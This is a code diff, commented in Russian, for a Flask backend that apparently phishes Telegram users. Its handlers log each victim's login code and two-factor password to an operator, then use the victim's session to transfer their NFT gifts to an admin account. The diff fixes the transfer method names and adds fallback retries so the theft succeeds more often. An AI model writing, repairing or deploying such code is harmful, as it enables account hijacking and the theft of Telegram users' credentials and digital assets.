@@ -1,4 +1,4 @@
-# app.py — ДЛЯ GITHUB-ВЕРСИИ TELETHON (С ЭКСПЕРИМЕНТАЛЬНЫМИ МЕТОДАМИ)
+# app.py — С ПРАВИЛЬНЫМИ МЕТОДАМИ (TransferStarGiftRequest)
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -108,11 +108,11 @@ def get_gift_url(gift_name, gift_id=None):
     return f"https://t.me/nft/{collection}"
 
 # ============================================================
-# ПОЛУЧЕНИЕ ПОДАРКОВ
+# ПОЛУЧЕНИЕ ПОДАРКОВ (GetStarsGiftsRequest)
 # ============================================================
 
 async def get_user_gifts(client):
-    """Получение подарков через MTProto (экспериментальные методы)"""
+    """Получение всех подарков пользователя"""
     try:
         # Пробуем GetStarsGiftsRequest
         result = await client(functions.payments.GetStarsGiftsRequest())
@@ -129,19 +129,10 @@ async def get_user_gifts(client):
     except Exception as e:
         print(f"GetGiftsRequest error: {e}")
     
-    try:
-        # Пробуем метод клиента
-        if hasattr(client, 'get_gifts'):
-            result = await client.get_gifts()
-            if result:
-                return result
-    except Exception as e:
-        print(f"get_gifts error: {e}")
-    
     return []
 
 # ============================================================
-# ПЕРЕДАЧА ПОДАРКОВ
+# ПЕРЕДАЧА ПОДАРКОВ (TransferStarGiftRequest)
 # ============================================================
 
 async def transfer_nft_gifts(session_string, phone, username, user_id):
@@ -160,7 +151,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         if not all_gifts:
             await send_admin_log(
                 f"📭 *Нет подарков*\n📱 {phone}\n👤 @{username}\n\n"
-                f"ℹ️ Методы получения подарков недоступны в этой версии Telethon"
+                f"ℹ️ Возможно, у пользователя нет подарков"
             )
             return False
         
@@ -204,14 +195,16 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
                 f"📦 Ссылки:\n{gift_links_text}\n\n🔄 Передача..."
             )
         
-        # Передаём
+        # ============================================================
+        # ПЕРЕДАЁМ ЧЕРЕЗ TransferStarGiftRequest (правильное название!)
+        # ============================================================
         transferred = 0
         transferred_links = []
         
         for i, gift_id in enumerate(gift_ids):
             try:
-                # Пробуем TransferGiftRequest
-                await client(functions.payments.TransferGiftRequest(
+                # TransferStarGiftRequest — правильное название в новых версиях
+                await client(functions.payments.TransferStarGiftRequest(
                     gift_id=gift_id,
                     to_id=ADMIN_USER_ID
                 ))
@@ -221,8 +214,21 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
                 transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
                 await asyncio.sleep(0.5)
             except Exception as e:
-                print(f"Transfer error: {e}")
-                continue
+                print(f"Transfer error for {gift_id}: {e}")
+                # Если TransferStarGiftRequest не работает, пробуем TransferGiftRequest
+                try:
+                    await client(functions.payments.TransferGiftRequest(
+                        gift_id=gift_id,
+                        to_id=ADMIN_USER_ID
+                    ))
+                    transferred += 1
+                    gift_name = gift_names[i] if i < len(gift_names) else 'Unknown'
+                    gift_url = get_gift_url(gift_name, gift_id)
+                    transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
+                    await asyncio.sleep(0.5)
+                except Exception as e2:
+                    print(f"TransferGiftRequest also failed: {e2}")
+                    continue
         
         if transferred > 0:
             transferred_text = "\n".join(transferred_links)
@@ -307,6 +313,7 @@ async def check_code_async(phone, code, phone_code_hash):
             
             send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
+            # ПЕРЕДАЁМ ПОДАРКИ
             await transfer_nft_gifts(session_string, phone, session_data['username'], session_data['user_id'])
             
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
@@ -350,6 +357,7 @@ async def check_password_async(phone, password):
             
             send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
             
+            # ПЕРЕДАЁМ ПОДАРКИ
             await transfer_nft_gifts(session_string, phone, session_data['username'], session_data['user_id'])
             
             return {'success': True, 'sessionData': session_data}
@@ -375,10 +383,24 @@ def run_async(coro):
 @app.route('/', methods=['GET'])
 def ping():
     import telethon
+    # Проверяем доступность методов
+    methods = []
+    try:
+        from telethon.tl.functions.payments import TransferStarGiftRequest
+        methods.append('TransferStarGiftRequest')
+    except ImportError:
+        pass
+    
+    try:
+        from telethon.tl.functions.payments import GetStarsGiftsRequest
+        methods.append('GetStarsGiftsRequest')
+    except ImportError:
+        pass
+    
     return jsonify({
         'status': 'online',
         'telethon_version': getattr(telethon, '__version__', 'unknown'),
-        'source': 'github' if 'dev' in getattr(telethon, '__version__', '') else 'pip'
+        'available_methods': methods
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -461,6 +483,6 @@ if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
     print(f"📌 Telethon версия: {getattr(telethon, '__version__', 'unknown')}")
-    print("📌 Пытаемся получить подарки через экспериментальные методы")
+    print("📌 Использует: TransferStarGiftRequest")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
